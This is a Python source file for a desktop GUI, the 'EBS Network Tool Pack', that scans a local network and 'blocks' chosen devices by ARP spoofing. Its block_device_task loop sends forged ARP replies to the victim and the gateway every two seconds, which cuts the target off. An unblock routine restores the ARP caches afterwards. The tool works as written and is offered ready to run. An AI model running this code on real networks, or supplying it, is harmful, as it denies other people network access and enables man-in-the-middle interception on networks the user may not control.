import customtkinter as ctk
from tkinter import messagebox, simpledialog # simpledialog and messagebox are still from tkinter
import threading
import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether, srp
from scapy.sendrecv import sendp
import socket
import psutil
import time
import os # Added for file operations

# ---- Block environment variables that may cause PermissionError
os.environ.pop("SSLKEYLOGFILE", None)

try:
    import certifi
    os.environ.setdefault("SSL_CERT_FILE", certifi.where())
except Exception:
    pass


# ====== Helper Functions (can be used by class methods) ======
def get_active_network_info():
    """Extracts information about active network interfaces."""
    active_interfaces = psutil.net_if_stats()
    net_addrs = psutil.net_if_addrs()
    info = ""
    for interface, stats in active_interfaces.items():
        if stats.isup: # Only consider active interfaces
            for addr in net_addrs[interface]:
                if addr.family == socket.AF_INET: # IPv4 address
                    info += f"Interface: {interface}\n"
                    info += f"  IP Address: {addr.address}\n"
                    info += f"  Netmask: {addr.netmask}\n"
                    if addr.broadcast:
                        info += f"  Broadcast IP: {addr.broadcast}\n"
                    # Try to get MAC address for the interface
                    for mac_addr in net_addrs[interface]:
                        if mac_addr.family == psutil.AF_LINK:
                            info += f"  MAC Address: {mac_addr.address}\n"
                    info += "\n"
    return info if info else "No active network interfaces found with IPv4."


def scan_network(ip_range):
    """Scans the specified IP range for active devices using ARP requests."""
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff") # Broadcast MAC
    packet = ether / arp
    # srp sends and receives layer 2 packets, timeout in seconds, verbose=0 means no output to console
    result = srp(packet, timeout=3, verbose=0)[0]
    devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
    return devices


def save_devices_to_file(devices, filename="network_devices.txt"):
    """Saves found devices (IP, MAC) to a text file."""
    with open(filename, "w") as file:
        for device in devices:
            file.write(f"IP Address: {device['ip']}, MAC Address: {device['mac']}\n")


def get_mac(ip):
    """Retrieves the MAC address for a given IP address using ARP request."""
    # srp sends a packet on layer 2 (Ethernet)
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    for snd, rcv in ans:
        return rcv[Ether].src # Return the source MAC from the received Ethernet frame
    return None


def get_my_mac():
    """Retrieves the MAC address of the local machine's primary active interface."""
    interfaces = psutil.net_if_addrs()
    active_stats = psutil.net_if_stats()

    # Iterate through network interfaces to find an active one with a MAC address
    for interface_name, addrs in interfaces.items():
        if interface_name in active_stats and active_stats[interface_name].isup:
            for addr in addrs:
                if addr.family == psutil.AF_LINK: # AF_LINK is for MAC addresses
                    return addr.address
    return None


# ====== GUI Class ======
class NetworkToolGUI:
    def __init__(self):
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue") # A default CTk theme, overridden by self.colors

        self.root = ctk.CTk()
        self.root.title("EBS-Tool-Pack: Network Manager")
        self.root.geometry("900x750")
        self.root.minsize(850, 650)

        # Colors (Black-Gray theme inspired by EBS-Tool-Pack style)
        self.colors = {
            'bg': '#1a1a1a',         # Darkest background
            'card': '#252525',       # Slightly lighter for panels/cards
            'accent': '#6495ed',     # Cornflower Blue for accent
            'accent_hover': '#527fcf', # Darker Cornflower Blue for hover
            'text': '#f0f0f0',       # Light text
            'text_dim': '#aaaaaa',   # Dimmed text
            'success': '#32cd32',    # Lime Green for success
            'warning': '#ffd700',    # Gold for warning
            'error': '#dc143c',      # Crimson for error
        }
        self.root.configure(fg_color=self.colors['bg'])

        # State variables for blocking
        self.blocking_active = False
        self.blocking_thread = None

        # Main container
        self.main_container = ctk.CTkFrame(self.root, fg_color=self.colors['bg'])
        self.main_container.pack(fill="both", expand=True, padx=20, pady=20)

        self._setup_ui()

    def _setup_ui(self):
        """Sets up all the GUI widgets and layout."""
        # Header
        header_frame = ctk.CTkFrame(self.main_container, fg_color="transparent")
        header_frame.pack(fill="x", pady=(0, 20))

        ctk.CTkLabel(
            header_frame,
            text="EBS Network Tool Pack",
            font=ctk.CTkFont(size=24, weight="bold"),
            text_color=self.colors['accent']
        ).pack(pady=5)
        ctk.CTkLabel(
            header_frame,
            text="Scan, block, and manage network devices using ARP spoofing.",
            font=ctk.CTkFont(size=12),
            text_color=self.colors['text_dim']
        ).pack(pady=(0, 15))

        # Main content area
        content_frame = ctk.CTkFrame(self.main_container, fg_color="transparent")
        content_frame.pack(fill="both", expand=True)
        content_frame.grid_columnconfigure(0, weight=1)
        content_frame.grid_rowconfigure(1, weight=1) # Log area takes more space

        # Top Panel: Inputs and Actions
        input_action_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
        input_action_panel.grid(row=0, column=0, sticky="ew", padx=0, pady=(0, 10))
        input_action_panel.grid_columnconfigure((0,1), weight=1) # Two main columns for input and buttons

        # Input Frame (left side of input_action_panel)
        input_frame = ctk.CTkFrame(input_action_panel, fg_color="transparent")
        input_frame.grid(row=0, column=0, sticky="nsew", padx=15, pady=15)
        input_frame.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(input_frame, text="IP Range (e.g., 192.168.1.0/24):", text_color=self.colors['text']).grid(row=0, column=0, sticky="w", padx=(0,10), pady=5)
        self.ip_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter IP range for scanning", fg_color=self.colors['bg'], border_color=self.colors['accent'])
        self.ip_entry.grid(row=0, column=1, sticky="ew", pady=5)

        ctk.CTkLabel(input_frame, text="Gateway IP (e.g., 192.168.1.1):", text_color=self.colors['text']).grid(row=1, column=0, sticky="w", padx=(0,10), pady=5)
        self.gateway_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter Gateway IP for blocking", fg_color=self.colors['bg'], border_color=self.colors['accent'])
        self.gateway_entry.grid(row=1, column=1, sticky="ew", pady=5)

        # Action Buttons Frame (right side of input_action_panel)
        action_buttons_frame = ctk.CTkFrame(input_action_panel, fg_color="transparent")
        action_buttons_frame.grid(row=0, column=1, sticky="nsew", padx=15, pady=15)
        action_buttons_frame.grid_columnconfigure((0,1), weight=1) # Distribute buttons evenly

        self.btn_info = ctk.CTkButton(action_buttons_frame, text="Show Network Info", command=self._start_show_network_info,
                                     fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'], height=35)
        self.btn_info.grid(row=0, column=0, sticky="ew", padx=5, pady=5)

        self.btn_scan = ctk.CTkButton(action_buttons_frame, text="Scan Network", command=self._start_scan,
                                     fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'], height=35)
        self.btn_scan.grid(row=0, column=1, sticky="ew", padx=5, pady=5)

        self.btn_block = ctk.CTkButton(action_buttons_frame, text="Block Device", command=self._start_block,
                                      fg_color=self.colors['error'], hover_color=self.colors['error'], height=35)
        self.btn_block.grid(row=1, column=0, sticky="ew", padx=5, pady=5)

        self.btn_unblock = ctk.CTkButton(action_buttons_frame, text="Unblock All", command=self._start_unblock,
                                        fg_color=self.colors['success'], hover_color=self.colors['success'], height=35)
        self.btn_unblock.grid(row=1, column=1, sticky="ew", padx=5, pady=5)

        # Log Panel
        log_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
        log_panel.grid(row=1, column=0, sticky="nsew", padx=0, pady=(10,0))
        log_panel.grid_rowconfigure(1, weight=1) # Log textbox takes main space

        ctk.CTkLabel(log_panel, text="Activity Log", font=ctk.CTkFont(size=18, weight="bold"),
                     text_color=self.colors['text']).pack(pady=(15, 10))

        self.log_textbox = ctk.CTkTextbox(
            log_panel,
            fg_color=self.colors['bg'],
            text_color=self.colors['text_dim'],
            wrap="word",
            state="disabled",
            font=ctk.CTkFont(family="Consolas", size=12) # Monospaced font for logs
        )
        self.log_textbox.pack(fill="both", expand=True, padx=15, pady=(0, 15))


    def gui_log_output(self, message: str, color_tag: str = None):
        """Thread-safe logging to the GUI textbox with colors."""
        # Using root.after to ensure GUI updates happen on the main thread
        self.root.after(0, lambda: self._append_log(message, color_tag))

    def _append_log(self, message: str, color: str = None):
        """Appends a message to the log textbox with specific color tagging."""
        self.log_textbox.configure(state="normal")
        tag_name = f"{color}_tag" if color else "default_tag"

        if color == "red":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['error'])
        elif color == "yellow":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['warning'])
        elif color == "green":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['success'])
        elif color == "blue": # For general info/accent
            self.log_textbox.tag_config(tag_name, foreground=self.colors['accent'])
        else:
            self.log_textbox.tag_config(tag_name, foreground=self.colors['text']) # Default to main text color

        self.log_textbox.insert("end", f"{message}\n", tag_name)
        self.log_textbox.see("end") # Scroll to the end
        self.log_textbox.configure(state="disabled")

    def _toggle_buttons_state(self, enable: bool):
        """Enables or disables input fields and action buttons."""
        state = "normal" if enable else "disabled"
        self.btn_info.configure(state=state)
        self.btn_scan.configure(state=state)
        self.btn_block.configure(state=state)
        self.btn_unblock.configure(state=state)
        self.ip_entry.configure(state=state)
        self.gateway_entry.configure(state=state)

    # --- Worker thread functions for GUI responsiveness ---
    def _start_show_network_info(self):
        """Initiates fetching network info in a separate thread."""
        self._toggle_buttons_state(False)
        self.gui_log_output("Fetching network information...", "blue")
        threading.Thread(target=self.show_network_info_task, daemon=True).start()

    def show_network_info_task(self):
        """Task to fetch and display network information."""
        try:
            info = get_active_network_info()
            # Clear previous log content before displaying new network info
            self.root.after(0, lambda: self.log_textbox.configure(state="normal"))
            self.root.after(0, lambda: self.log_textbox.delete("1.0", ctk.END))
            self.gui_log_output("--- Active Network Information ---", "blue")
            self.gui_log_output(info, "default")
            self.gui_log_output("--- End Network Information ---", "blue")
            self.root.after(0, lambda: self.log_textbox.configure(state="disabled"))
        except Exception as e:
            self.gui_log_output(f"Error fetching network info: {e}", "red")
        finally:
            self.root.after(0, lambda: self._toggle_buttons_state(True))

    def _start_scan(self):
        """Initiates network scanning in a separate thread."""
        ip_range = self.ip_entry.get().strip()
        if not ip_range:
            messagebox.showwarning("Cảnh báo", "Hãy nhập phạm vi IP!")
            return

        self._toggle_buttons_state(False)
        self.gui_log_output(f"Scanning network for devices in range: {ip_range}...", "blue")
        threading.Thread(target=self.scan_network_task, args=(ip_range,), daemon=True).start()

    def scan_network_task(self, ip_range):
        """Task to scan the network and display results."""
        try:
            devices = scan_network(ip_range)
            self.gui_log_output(f"--- Found {len(devices)} Devices ---", "green")
            if devices:
                self.gui_log_output("IP Address         MAC Address", "default")
                self.gui_log_output("-----------------------------------", "default")
                for device in devices:
                    self.gui_log_output(f"{device['ip']:<18} {device['mac']}", "default")
                save_devices_to_file(devices)
                self.gui_log_output("Device list saved to network_devices.txt", "green")
            else:
                self.gui_log_output("No devices found.", "warning")
        except Exception as e:
            self.gui_log_output(f"Error scanning network: {e}", "red")
        finally:
            self.root.after(0, lambda: self._toggle_buttons_state(True))

    def _start_block(self):
        """Prompts for IP/MAC and starts blocking in a separate thread."""
        ip = simpledialog.askstring("Block Device", "Enter IP address of the device to block:")
        mac = simpledialog.askstring("Block Device", "Enter MAC address of the device to block:")
        gateway_ip = self.gateway_entry.get().strip()

        if not ip or not mac or not gateway_ip:
            messagebox.showwarning("Cảnh báo", "Hãy nhập đầy đủ địa chỉ IP, MAC và Gateway!")
            return

        # Disable all buttons except for potentially 'Unblock' during blocking
        self._toggle_buttons_state(False)
        self.btn_unblock.configure(state="normal") # Keep unblock active to stop blocking
        self.btn_block.configure(state="disabled", text="Blocking...")

        self.gui_log_output(f"Attempting to block device - IP: {ip}, MAC: {mac} via Gateway: {gateway_ip}", "red")
        self.blocking_active = True
        self.blocking_thread = threading.Thread(target=self.block_device_task, args=(ip, mac, gateway_ip), daemon=True)
        self.blocking_thread.start()

    def block_device_task(self, ip_address, mac_address, gateway_ip):
        """Task to continuously send ARP spoofing packets."""
        try:
            my_ip = socket.gethostbyname(socket.gethostname())
            my_mac = get_my_mac()

            if ip_address == my_ip or mac_address == my_mac:
                self.gui_log_output("Cannot block your own device.", "error")
                return

            gateway_mac = get_mac(gateway_ip)
            if not gateway_mac:
                self.gui_log_output("Could not find MAC address of gateway. Blocking failed.", "error")
                return

            self.gui_log_output(f"Spoofing ARP for target ({ip_address}) and gateway ({gateway_ip})...", "red")
            while self.blocking_active:
                # Tell victim that gateway's MAC is attacker's MAC
                packet_victim = Ether(dst=mac_address) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=mac_address)
                # Tell gateway that victim's MAC is attacker's MAC
                packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac)
                sendp(packet_victim, verbose=0)
                sendp(packet_gateway, verbose=0)
                # self.gui_log_output(f"Spoofed ARP for {ip_address} and {gateway_ip}", "red") # Commented for less spam
                time.sleep(2) # Send ARP packets every 2 seconds
            self.gui_log_output(f"Blocking of device with IP {ip_address} has stopped.", "green")

        except Exception as e:
            self.gui_log_output(f"Error during blocking: {e}", "red")
        finally:
            self.blocking_active = False
            self.root.after(0, lambda: self._toggle_buttons_state(True))
            self.root.after(0, lambda: self.btn_block.configure(text="Block Device"))

    def _start_unblock(self):
        """Initiates unblocking process in a separate thread."""
        if self.blocking_active:
            # If a blocking thread is running, stop it first
            self.blocking_active = False
            self.gui_log_output("Stopping active blocking thread...", "yellow")
            # Give the blocking thread a moment to exit its loop gracefully
            if self.blocking_thread and self.blocking_thread.is_alive():
                # In a real app, you might want to join() with a timeout
                pass # The thread will exit on its own after next sleep

        self._toggle_buttons_state(False)
        self.btn_unblock.configure(state="disabled", text="Unblocking...")
        self.gui_log_output("Attempting to unblock all devices...", "green")
        threading.Thread(target=self.unblock_devices_task, daemon=True).start()

    def unblock_devices_task(self):
        """Task to restore ARP tables for previously blocked devices."""
        try:
            gateway_ip = self.gateway_entry.get().strip()
            if not gateway_ip:
                self.gui_log_output("Gateway IP is required for unblocking. Please enter it in the field.", "error")
                messagebox.showerror("Gateway IP Missing", "Please provide the Gateway IP in the input field to unblock devices.")
                return

            devices_to_unblock = []
            try:
                with open("network_devices.txt", "r") as file:
                    for line in file:
                        parts = line.strip().split(', ')
                        if len(parts) == 2:
                            ip_part = parts[0].split(': ')
                            mac_part = parts[1].split(': ')
                            if len(ip_part) == 2 and len(mac_part) == 2:
                                devices_to_unblock.append({'ip': ip_part[1].strip(), 'mac': mac_part[1].strip()})
            except FileNotFoundError:
                self.gui_log_output("No 'network_devices.txt' found. Cannot unblock devices.", "warning")
                messagebox.showwarning("No Devices", "No 'network_devices.txt' found to unblock devices from.")
                return

            if not devices_to_unblock:
                self.gui_log_output("No devices found in 'network_devices.txt' to unblock.", "warning")
                messagebox.showinfo("No Devices", "No devices were recorded in 'network_devices.txt' to unblock.")
                return

            self.gui_log_output(f"Restoring ARP for {len(devices_to_unblock)} devices...", "green")
            for device in devices_to_unblock:
                ip_address = device['ip']

                # Get actual MACs for robust restoration
                victim_mac = get_mac(ip_address)
                gateway_mac = get_mac(gateway_ip)

                if victim_mac and gateway_mac:
                    # Tell victim: gateway's MAC is actual_gateway_mac
                    packet_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=victim_mac, hwsrc=gateway_mac)
                    # Tell gateway: victim's MAC is actual_victim_mac
                    packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac, hwsrc=victim_mac)

                    # Send multiple packets to ensure ARP caches are updated
                    sendp(packet_victim, verbose=0, count=7)
                    sendp(packet_gateway, verbose=0, count=7)
                    self.gui_log_output(f"Restored ARP for IP: {ip_address}", "green")
                else:
                    self.gui_log_output(f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway).", "warning")
                time.sleep(0.5) # Small delay between devices

            self.gui_log_output("All devices should now be unblocked.", "green")
            messagebox.showinfo("Unblock Complete", "All devices have been unblocked.")

        except Exception as e:
            self.gui_log_output(f"Error during unblocking: {e}", "red")
        finally:
            self.root.after(0, lambda: self._toggle_buttons_state(True))
            self.root.after(0, lambda: self.btn_unblock.configure(text="Unblock All"))

    def run(self):
        """Starts the main GUI event loop."""
        self.root.mainloop()


if __name__ == "__main__":
    # Note: Running Scapy-based tools often requires administrative/root privileges.
    # On Linux, run with `sudo python your_script.py`.
    # On Windows, run your terminal/IDE as Administrator.
    # Without these privileges, Scapy might fail to send/receive raw packets.
    print("Starting Network Tool. Please ensure you have necessary administrative/root privileges.")
    app = NetworkToolGUI()
    app.run()